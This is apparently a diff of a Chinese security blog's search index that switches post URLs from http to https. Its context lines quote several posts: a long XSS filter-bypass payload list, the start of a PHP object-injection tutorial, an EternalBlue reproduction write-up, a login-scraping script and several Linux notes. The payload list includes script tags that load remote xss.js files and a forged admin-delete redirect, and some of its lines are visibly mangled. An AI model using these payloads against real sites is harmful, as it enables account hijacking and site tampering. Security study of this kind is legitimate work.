class="line">(18)空字符2,空字符在国内基本没效果.因为没有地方可以利用</span><br><span class="line">perl -e ‘print “&lt;SCR\0IPT&gt;alert(\”XSS\”)&lt;/SCR\0IPT&gt;”;’ &gt; out</span><br><span class="line"></span><br><span class="line">(19)Spaces和meta前的IMG标签</span><br><span class="line">&lt;IMG SRC=”   javascript:alert(‘XSS’);”&gt;</span><br><span class="line"></span><br><span class="line">(20)Non-alpha-non-digit XSS</span><br><span class="line">&lt;SCRIPT/XSS SRC=”http://3w.org/XSS/xss.js”&gt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(21)Non-alpha-non-digit XSS to 2</span><br><span class="line">&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(“XSS”)&gt;</span><br><span class="line"></span><br><span class="line">(22)Non-alpha-non-digit XSS to 3</span><br><span class="line">&lt;SCRIPT/SRC=”http://3w.org/XSS/xss.js”&gt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(23)双开括号</span><br><span class="line">&lt;&lt;SCRIPT&gt;alert(“XSS”);//&lt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(24)无结束脚本标记(仅火狐等浏览器)</span><br><span class="line">&lt;SCRIPT SRC=http://3w.org/XSS/xss.js?&lt;B&gt;</span><br><span class="line"></span><br><span class="line">(25)无结束脚本标记2</span><br><span class="line">&lt;SCRIPT SRC=//3w.org/XSS/xss.js&gt;</span><br><span class="line"></span><br><span class="line">(26)半开的HTML/JavaScript XSS</span><br><span class="line">&lt;IMG SRC=”javascript:alert(‘XSS’)”</span><br><span class="line"></span><br><span class="line">(27)双开角括号</span><br><span class="line">&lt;iframe src=http://3w.org/XSS.html &lt;</span><br><span class="line"></span><br><span class="line">(28)无单引号 双引号 分号</span><br><span class="line">&lt;SCRIPT&gt;a=/XSS/</span><br><span class="line">alert(a.source)&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(29)换码过滤的JavaScript</span><br><span class="line">\”;alert(‘XSS’);//</span><br><span class="line"></span><br><span class="line">(30)结束Title标签</span><br><span class="line">&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(“XSS”);&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(31)Input Image</span><br><span class="line">&lt;INPUT SRC=”javascript:alert(‘XSS’);”&gt;</span><br><span class="line"></span><br><span class="line">(32)BODY Image</span><br><span class="line">&lt;BODY BACKGROUND=”javascript:alert(‘XSS’)”&gt;</span><br><span class="line"></span><br><span class="line">(33)BODY标签</span><br><span class="line">&lt;BODY(‘XSS’)&gt;</span><br><span class="line"></span><br><span class="line">(34)IMG Dynsrc</span><br><span class="line">&lt;IMG DYNSRC=”javascript:alert(‘XSS’)”&gt;</span><br><span class="line"></span><br><span class="line">(35)IMG Lowsrc</span><br><span class="line">&lt;IMG LOWSRC=”javascript:alert(‘XSS’)”&gt;</span><br><span class="line"></span><br><span class="line">(36)BGSOUND</span><br><span class="line">&lt;BGSOUND SRC=”javascript:alert(‘XSS’);”&gt;</span><br><span class="line"></span><br><span class="line">(37)STYLE sheet</span><br><span class="line">&lt;LINK REL=”stylesheet” HREF=”javascript:alert(‘XSS’);”&gt;</span><br><span class="line"></span><br><span class="line">(38)远程样式表</span><br><span class="line">&lt;LINK REL=”stylesheet” HREF=”http://3w.org/xss.css”&gt;</span><br><span class="line"></span><br><span class="line">(39)List-style-image(列表式)</span><br><span class="line">&lt;STYLE&gt;li &#123;list-style-image: url(“javascript:alert(‘XSS’)”);&#125;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS</span><br><span class="line"></span><br><span class="line">(40)IMG VBscript</span><br><span class="line">&lt;IMG SRC=’vbscript:msgbox(“XSS”)’&gt;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS</span><br><span class="line"></span><br><span class="line">(41)META链接url</span><br><span class="line">&lt;META HTTP-EQUIV=”refresh” CONTENT=”0; URL=http://;URL=javascript:alert(‘XSS’);”&gt;</span><br><span class="line"></span><br><span class="line">(42)Iframe</span><br><span class="line">&lt;IFRAME SRC=”javascript:alert(‘XSS’);”&gt;&lt;/IFRAME&gt;</span><br><span class="line"></span><br><span class="line">(43)Frame</span><br><span class="line">&lt;FRAMESET&gt;&lt;FRAME SRC=”javascript:alert(‘XSS’);”&gt;&lt;/FRAMESET&gt;</span><br><span class="line"></span><br><span class="line">(44)Table</span><br><span class="line">&lt;TABLE BACKGROUND=”javascript:alert(‘XSS’)”&gt;</span><br><span class="line"></span><br><span class="line">(45)TD</span><br><span class="line">&lt;TABLE&gt;&lt;TD BACKGROUND=”javascript:alert(‘XSS’)”&gt;</span><br><span class="line"></span><br><span class="line">(46)DIV background-image</span><br><span class="line">&lt;DIV STYLE=”background-image: none)”&gt;</span><br><span class="line"></span><br><span class="line">(47)DIV background-image后加上额外字符(1-32&amp;34&amp;39&amp;160&amp;8192-8&amp;13&amp;12288&amp;65279)</span><br><span class="line">&lt;DIV STYLE=”background-image: none)”&gt;</span><br><span class="line"></span><br><span class="line">(48)DIV expression</span><br><span class="line">&lt;DIV STYLE=”width: expression_r(alert(‘XSS’));”&gt;</span><br><span class="line"></span><br><span class="line">(49)STYLE属性分拆表达</span><br><span class="line">&lt;IMG STYLE=”xss:expression_r(alert(‘XSS’))”&gt;</span><br><span class="line"></span><br><span class="line">(50)匿名STYLE(组成:开角号和一个字母开头)</span><br><span class="line">&lt;XSS STYLE=”xss:expression_r(alert(‘XSS’))”&gt;</span><br><span class="line"></span><br><span class="line">(51)STYLE background-image</span><br><span class="line">&lt;STYLE&gt;.XSS&#123;background-image:none”);&#125;&lt;/STYLE&gt;&lt;A class=&quot;XSS&quot;&gt;&lt;/A&gt;</span><br><span class="line"></span><br><span class="line">(52)IMG STYLE方式</span><br><span class="line">exppression(alert(“XSS”))’&gt;</span><br><span class="line"></span><br><span class="line">(53)STYLE background</span><br><span class="line">&lt;STYLE&gt;&lt;STYLE type=”text/css”&gt;BODY&#123;background:url(“javascript:alert(‘XSS’)”)&#125;&lt;/STYLE&gt;</span><br><span class="line"></span><br><span class="line">(54)BASE</span><br><span class="line">&lt;BASE HREF=”javascript:alert(‘XSS’);//”&gt;</span><br><span class="line"></span><br><span class="line">(55)EMBED标签,你可以嵌入FLASH,其中包涵XSS</span><br><span class="line">&lt;EMBED SRC=”http://3w.org/XSS/xss.swf” &gt;&lt;/EMBED&gt;</span><br><span class="line"></span><br><span class="line">(56)在flash中使用ActionScrpt可以混进你XSS的代码</span><br><span class="line">a=”get”;</span><br><span class="line">b=”URL(\”&quot;;</span><br><span class="line">c=”javascript:”;</span><br><span class="line">d=”alert(‘XSS’);\”)”;</span><br><span class="line">eval_r(a+b+c+d);</span><br><span class="line"></span><br><span class="line">(57)XML namespace.HTC文件必须和你的XSS载体在一台服务器上</span><br><span class="line">&lt;HTML xmlns:xss&gt;</span><br><span class="line">&lt;?import namespace=”xss” implementation=”http://3w.org/XSS/xss.htc”&gt;</span><br><span class="line">&lt;xss:xss&gt;XSS&lt;/xss:xss&gt;</span><br><span class="line">&lt;/HTML&gt;</span><br><span class="line"></span><br><span class="line">(58)如果过滤了你的JS你可以在图片里添加JS代码来利用</span><br><span class="line">&lt;SCRIPT SRC=””&gt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(59)IMG嵌入式命令,可执行任意命令</span><br><span class="line">&lt;IMG SRC=”http://www.XXX.com/a.php?a=b”&gt;</span><br><span class="line"></span><br><span class="line">(60)IMG嵌入式命令(a.jpg在同服务器)</span><br><span class="line">Redirect 302 /a.jpg http://www.XXX.com/admin.asp&amp;deleteuser</span><br><span class="line"></span><br><span class="line">(61)绕符号过滤</span><br><span class="line">&lt;SCRIPT a=”&gt;” SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(62)</span><br><span class="line">&lt;SCRIPT =”&gt;” SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(63)</span><br><span class="line">&lt;SCRIPT a=”&gt;” ” SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(64)</span><br><span class="line">&lt;SCRIPT “a=’&gt;’” SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(65)</span><br><span class="line">&lt;SCRIPT a=`&gt;` SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(66)</span><br><span class="line">&lt;SCRIPT a=”&gt;’&gt;” SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(67)</span><br><span class="line">&lt;SCRIPT&gt;document.write(“&lt;SCRI”);&lt;/SCRIPT&gt;PT SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(68)URL绕行</span><br><span class="line">&lt;A HREF=”http://127.0.0.1/”&gt;XSS&lt;/A&gt;</span><br><span class="line"></span><br><span class="line">(69)URL编码</span><br><span class="line">&lt;A HREF=”http://3w.org”&gt;XSS&lt;/A&gt;</span><br><span class="line"></span><br><span class="line">(70)IP十进制</span><br><span class="line">&lt;A HREF=”http://3232235521″&gt;XSS&lt;/A&gt;</span><br><span class="line"></span><br><span class="line">(71)IP十六进制</span><br><span class="line">&lt;A HREF=”http://0xc0.0xa8.0×00.0×01″&gt;XSS&lt;/A&gt;</span><br><span class="line"></span><br><span class="line">(72)IP八进制</span><br><span class="line">&lt;A HREF=”http://0300.0250.0000.0001″&gt;XSS&lt;/A&gt;</span><br><span class="line"></span><br><span class="line">(73)混合编码</span><br><span class="line">&lt;A HREF=”h</span><br><span class="line">tt p://6 6.000146.0×7.147/”&quot;&gt;XSS&lt;/A&gt;</span><br><span class="line"></span><br><span class="line">(74)节省[http:]</span><br><span class="line">&lt;A HREF=”//www.google.com/”&gt;XSS&lt;/A&gt;</span><br><span class="line"></span><br><span class="line">(75)节省[www]</span><br><span class="line">&lt;A HREF=”http://google.com/”&gt;XSS&lt;/A&gt;</span><br><span class="line"></span><br><span class="line">(76)绝对点绝对DNS</span><br><span class="line">&lt;A HREF=”http://www.google.com./”&gt;XSS&lt;/A&gt;</span><br><span class="line"></span><br><span class="line">(77)javascript链接</span><br><span class="line">&lt;A HREF=”javascript:document.location=’http://www.google.com/’”&gt;XSS&lt;/A&gt;</span><br></pre></td></tr></table></figure>]]></content>
       
         <categories>
@@ -3612,7 +3612,7 @@
     
     <entry>
       <title><![CDATA[理解php序列化漏洞]]></title>
-      <url>http://uknowsec.cn/posts/notes/%E7%90%86%E8%A7%A3php%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html</url>
+      <url>https://uknowsec.cn/posts/notes/%E7%90%86%E8%A7%A3php%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html</url>
       <content type="html"><![CDATA[<p>PHP对象注入是一个非常常见的漏洞，这个类型的漏洞虽然有些难以利用，但仍旧非常危险。为了理解这个漏洞，请读者具备基础的php知识。类和变量是非常容易理解的php概念。举个例子，1.php在一个类中定义了一个变量和一个方法。它创建了一个对象并且调用了PrintVariable函数，该函数会输出变量variable。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">   </span><br><span class="line">class TestClass  </span><br><span class="line">&#123;  </span><br><span class="line">    // 一个变量  </span><br><span class="line">   </span><br><span class="line">    public $variable = &apos;This is a string&apos;;  </span><br><span class="line">   </span><br><span class="line">    // 一个简单的方法  </span><br><span class="line">   </span><br><span class="line">    public function PrintVariable()  </span><br><span class="line">    &#123;  </span><br><span class="line">        echo $this-&gt;variable;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">   </span><br><span class="line">// 创建一个对象  </span><br><span class="line">   </span><br><span class="line">$object = new TestClass();  </span><br><span class="line">   </span><br><span class="line">// 调用一个方法  </span><br><span class="line">   </span><br><span class="line">$object-&gt;PrintVariable();  </span><br><span class="line">   </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 <p><img src="http://img.blog.csdn.net/20161225214524536" alt=""></p>
@@ -3665,7 +3665,7 @@
     
     <entry>
       <title><![CDATA[方程式 0day Eternalblue复现]]></title>
-      <url>http://uknowsec.cn/posts/notes/%E6%96%B9%E7%A8%8B%E5%BC%8F-0day-Eternalblue%E5%A4%8D%E7%8E%B0.html</url>
+      <url>https://uknowsec.cn/posts/notes/%E6%96%B9%E7%A8%8B%E5%BC%8F-0day-Eternalblue%E5%A4%8D%E7%8E%B0.html</url>
       <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>昨天去学长公司了，在公司呆了一下午。其间学长的同事让我复现下方程式Eternalblue，但是由于我没有带电脑所以没有在那边进行复现。Eternalblue之前我是有复现过的，那时候是用吐司上别人发的MSF集成的脚本。但是好像是成功了，回来打开KALI还看到之前的成功记录。这次再次进行一次复现，在这个过程中，一开始我是按照学长同事给的freebuf上的一篇文章来的，但是我最初下载的Empire是最新版的，然后在配置listeners的过程中出现错误，不能配置。无奈在他人的提醒下下载了1.6版本但是由于之前安装了最新版的问题，1.6无法安装。所以只能直接用msf进行监听了。</p>
 <h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><h3 id="攻击机"><a href="#攻击机" class="headerlink" title="攻击机"></a>攻击机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">攻击机 ： 10.15.17.215</span><br><span class="line">win7 32bit 旗舰版</span><br><span class="line">python-2.6.6.msi</span><br><span class="line">https://www.python.org/download/releases/2.6.6/</span><br><span class="line">pywin32-221.win32-py2.6.exe</span><br><span class="line">https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/</span><br></pre></td></tr></table></figure>
 <p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170526102843.jpg" alt=""></p>
@@ -3712,7 +3712,7 @@
     
     <entry>
       <title><![CDATA[Python编程实践学习--模拟登录爬取信息]]></title>
-      <url>http://uknowsec.cn/posts/notes/python%E7%BC%96%E7%A8%8B%E5%AE%9E%E8%B7%B5%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E7%88%AC%E5%8F%96%E4%BF%A1%E6%81%AF.html</url>
+      <url>https://uknowsec.cn/posts/notes/python%E7%BC%96%E7%A8%8B%E5%AE%9E%E8%B7%B5%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E7%88%AC%E5%8F%96%E4%BF%A1%E6%81%AF.html</url>
       <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在安全牛看《简单学python安全》这套视频教材，然后自己也想写个小东西，恰巧学习的一个信息系统，同学们的账号密码都是默认的，而且没有验证码，相对简单。所以就开始了这个小脚本的编写历程。这个过程中遇到了不少问题，请教了学长，在学长的帮助和指导下完成。在此回顾总结下这次过程。</p>
 <h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h3><p>一开始自己抓包分析的时候，出现了一些问题。登录过程分析得不够严谨，以致于模拟登录的时候出现不能登录上去的问题，后来学长帮我分析了下。原来这个模拟登录过程需要两个POST请求过程，而在这个过程中之前我使用的是urllib这个库来模拟登录，在学长的提示下使用request这个相较于urllib先进的库</p>
 <h4 id="第一个POST包"><a href="#第一个POST包" class="headerlink" title="第一个POST包"></a>第一个POST包</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /renzheng.jsp HTTP/1.1</span><br><span class="line">Host: xxxx.xxxx.edu.cn</span><br><span class="line">Content-Length: 142</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://xxxx.xxxx.edu.cn</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Referer: http://xxxx.xxxx.edu.cn</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8</span><br><span class="line">Cookie: UM_distinctid=15b7be26085454-0504ed9f0e367d-3c365402-100200-15b7be26086832; JSESSIONID=213C06E58934DCED50E4E479858CB055</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">displayName=&amp;displayPasswd=&amp;select=2&amp;submit.x=36&amp;submit.y=14&amp;operType=911&amp;random_form=-1048366953725273893&amp;userName=xxxxx&amp;passwd=xxxxx</span><br></pre></td></tr></table></figure>
@@ -3806,7 +3806,7 @@
     
     <entry>
       <title><![CDATA[【转载】HTTP：超文本传输协议]]></title>
-      <url>http://uknowsec.cn/posts/notes/HTTP%EF%BC%9A%E8%B6%85%E6%96%87%E6%9C%AC%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE.html</url>
+      <url>https://uknowsec.cn/posts/notes/HTTP%EF%BC%9A%E8%B6%85%E6%96%87%E6%9C%AC%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE.html</url>
       <content type="html"><![CDATA[<h1 id="HTTP简介"><a href="#HTTP简介" class="headerlink" title="HTTP简介"></a>HTTP简介</h1><p>HTTP协议是Hyper Text Transfer Protocol（超文本传输协议）的缩写,是用于从万维网（WWW:World Wide Web ）服务器传输超文本到本地浏览器的传送协议。</p>
 <p>HTTP是一个基于TCP/IP通信协议来传递数据（HTML 文件, 图片文件, 查询结果等）。</p>
 <p>HTTP是一个属于应用层的面向对象的协议，由于其简捷、快速的方式，适用于分布式超媒体信息系统。它于1990年提出，经过几年的使用与发展，得到不断地完善和扩展。目前在WWW中使用的是HTTP/1.0的第六版，HTTP/1.1的规范化工作正在进行之中，而且HTTP-NG(Next Generation of HTTP)的建议已经提出。</p>
@@ -3955,7 +3955,7 @@
     
     <entry>
       <title><![CDATA[Ubuntu Server下安装配置Metasploit]]></title>
-      <url>http://uknowsec.cn/posts/notes/Ubuntu-Server%E4%B8%8B%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AEMetasploit.html</url>
+      <url>https://uknowsec.cn/posts/notes/Ubuntu-Server%E4%B8%8B%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AEMetasploit.html</url>
       <content type="html"><![CDATA[<h1 id="安装postgersql"><a href="#安装postgersql" class="headerlink" title="安装postgersql"></a>安装postgersql</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install postgersql</span><br></pre></td></tr></table></figure>
 <h1 id="下载Metasploit"><a href="#下载Metasploit" class="headerlink" title="下载Metasploit"></a>下载Metasploit</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /opt</span><br><span class="line">wget http://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run</span><br></pre></td></tr></table></figure>
 <h1 id="安装Metasploit"><a href="#安装Metasploit" class="headerlink" title="安装Metasploit"></a>安装Metasploit</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /opt</span><br><span class="line">sudo mkdir metasploit</span><br><span class="line">sudo ./metasploit-latest-linux-x64-installer.run</span><br></pre></td></tr></table></figure>
@@ -3985,7 +3985,7 @@
     
     <entry>
       <title><![CDATA[《TCP/IP详解 卷1：协议》学习笔记]]></title>
-      <url>http://uknowsec.cn/posts/notes/%E3%80%8ATCP-IP%E8%AF%A6%E8%A7%A3-%E5%8D%B71%EF%BC%9A%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
+      <url>https://uknowsec.cn/posts/notes/%E3%80%8ATCP-IP%E8%AF%A6%E8%A7%A3-%E5%8D%B71%EF%BC%9A%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
       <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><h2 id="分层"><a href="#分层" class="headerlink" title="分层"></a>分层</h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/141924136983820.png" alt=""></p>
 <ul>
 <li>链路层：处理与电缆（或其他任何传输媒介）的物理接口细节（Telnet,FTP和e-mail等）</li>
@@ -5042,7 +5042,7 @@
     
     <entry>
       <title><![CDATA[[第四周]LinuxLinux各个目录的作用及内容]]></title>
-      <url>http://uknowsec.cn/posts/linux/%E7%AC%AC%E5%9B%9B%E5%91%A8-LinuxLinux%E5%90%84%E4%B8%AA%E7%9B%AE%E5%BD%95%E7%9A%84%E4%BD%9C%E7%94%A8%E5%8F%8A%E5%86%85%E5%AE%B9.html</url>
+      <url>https://uknowsec.cn/posts/linux/%E7%AC%AC%E5%9B%9B%E5%91%A8-LinuxLinux%E5%90%84%E4%B8%AA%E7%9B%AE%E5%BD%95%E7%9A%84%E4%BD%9C%E7%94%A8%E5%8F%8A%E5%86%85%E5%AE%B9.html</url>
       <content type="html"><![CDATA[<h2 id="主要目录"><a href="#主要目录" class="headerlink" title="主要目录"></a>主要目录</h2><h3 id=""><a href="#" class="headerlink" title="/"></a>/</h3><p>/处于Linux文件系统树形结构的最顶端，它是Linux文件系统的入口，所有的目录、文件、设备都在/之下。</p>
 <h3 id="bin"><a href="#bin" class="headerlink" title="/bin"></a>/bin</h3><p>该目录存放着系统最常用的最重要的命令，相当于DOS下的内部命令，只不过它们是以独立的文件形式存在。比如：ls、cp、mkdir等命令。这个目录中的文件都是可执行的并且是普通用户都可以使用的命令。作为系统最基础的命令都放在这里。</p>
 <h3 id="usr"><a href="#usr" class="headerlink" title="/usr"></a>/usr</h3><p>该目录是系统存放程序的地方，比如普通命令、帮助文件、安装的软件等。这个目录下有很多的文件和目录。当我们安装一个Linux发行版官方提供的软件包时，大多安装在这里。当有涉及服务器的配置文件时，会把配置文件安装在/etc目录中。/usr目录下包括涉及字体目录/usr/share/fonts、帮助目录/usr/share/man或/usr/share/doc等。</p>
@@ -5098,7 +5098,7 @@
     
     <entry>
       <title><![CDATA[Ubuntu 16.10下root用户直接登录]]></title>
-      <url>http://uknowsec.cn/posts/linux/%E7%AC%AC%E5%9B%9B%E5%91%A8-Ubuntu-16-10%E4%B8%8Broot%E7%94%A8%E6%88%B7%E7%9B%B4%E6%8E%A5%E7%99%BB%E5%BD%95.html</url>
+      <url>https://uknowsec.cn/posts/linux/%E7%AC%AC%E5%9B%9B%E5%91%A8-Ubuntu-16-10%E4%B8%8Broot%E7%94%A8%E6%88%B7%E7%9B%B4%E6%8E%A5%E7%99%BB%E5%BD%95.html</url>
       <content type="html"><![CDATA[<h3 id="设置root密码"><a href="#设置root密码" class="headerlink" title="设置root密码"></a>设置root密码</h3><p>使用如下命令设置root密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd root</span><br></pre></td></tr></table></figure></p>
 <h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>使用如下命令测试是否可以进入root用户，如果@前的用户名变为root则说明设置成功<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br></pre></td></tr></table></figure></p>
 <h3 id="修改文件"><a href="#修改文件" class="headerlink" title="修改文件"></a>修改文件</h3><p>进入到进入到/usr/share/lightdm/lightdm.conf.d/目录,使用如下命令打开此文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gedit 50-unity-greeter.conf</span><br></pre></td></tr></table></figure></p>
@@ -5119,7 +5119,7 @@
     
     <entry>
       <title><![CDATA[Ubuntu 16.10下JDK8的安装配置]]></title>
-      <url>http://uknowsec.cn/posts/linux/%E7%AC%AC%E4%B8%89%E5%91%A8-Ubuntu-16-10%E4%B8%8BJDK8%E7%9A%84%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE.html</url>
+      <url>https://uknowsec.cn/posts/linux/%E7%AC%AC%E4%B8%89%E5%91%A8-Ubuntu-16-10%E4%B8%8BJDK8%E7%9A%84%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE.html</url>
       <content type="html"><![CDATA[<h2 id="JDK8安装"><a href="#JDK8安装" class="headerlink" title="JDK8安装"></a>JDK8安装</h2><p>安装只需输入命令即可</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:webupd8team/java  </span><br><span class="line">sudo apt-get update  </span><br><span class="line">sudo apt-get install oracle-java8-installer</span><br></pre></td></tr></table></figure>
 <p>测试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -version</span><br></pre></td></tr></table></figure></p>
@@ -5145,7 +5145,7 @@
     
     <entry>
       <title><![CDATA[Ubuntu 16.10下gcc/g++编译器使用简介]]></title>
-      <url>http://uknowsec.cn/posts/linux/%E7%AC%AC%E4%B8%89%E5%91%A8-Ubuntu-16-10%E4%B8%8Bgcc-g-%E7%BC%96%E8%AF%91%E5%99%A8%E4%BD%BF%E7%94%A8%E7%AE%80%E4%BB%8B.html</url>
+      <url>https://uknowsec.cn/posts/linux/%E7%AC%AC%E4%B8%89%E5%91%A8-Ubuntu-16-10%E4%B8%8Bgcc-g-%E7%BC%96%E8%AF%91%E5%99%A8%E4%BD%BF%E7%94%A8%E7%AE%80%E4%BB%8B.html</url>
       <content type="html"><![CDATA[<h1 id="GCC"><a href="#GCC" class="headerlink" title="GCC"></a>GCC</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>GCC（GNU Compiler Collection，GNU编译器套装），是一套由 GNU 开发的编程语言编译器。它是一套以 GPL 及 LGPL 许可证所发行的自由软件，也是 GNU计划 的关键部分，亦是自由的 类Unix 及苹果计算机 Mac OS X 操作系统的标准编译器。GCC（特别是其中的C语言编译器）也常被认为是跨平台编译器的事实标准。</p>
 <h2 id="简单编译"><a href="#简单编译" class="headerlink" title="简单编译"></a>简单编译</h2><h3 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	printf(&quot;hello world!\n&quot;);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>这个程序，一步到位的编译指令是:</p>
@@ -5179,7 +5179,7 @@
     
     <entry>
       <title><![CDATA[Ubuntu 16.10日常折腾二三事]]></title>
-      <url>http://uknowsec.cn/posts/linux/%E7%AC%AC%E4%B8%89%E5%91%A8-Ubuntu-16-10%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE%E4%BA%8C%E4%B8%89%E4%BA%8B.html</url>
+      <url>https://uknowsec.cn/posts/linux/%E7%AC%AC%E4%B8%89%E5%91%A8-Ubuntu-16-10%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE%E4%BA%8C%E4%B8%89%E4%BA%8B.html</url>
       <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前我是装的Ubuntu 14.10的，后来…后来可能是喜欢折腾。把Ubuntu 14.10卸载了，装了最新版的Ubuntu 16.10版本，装完之后还是折腾那几件事。</p>
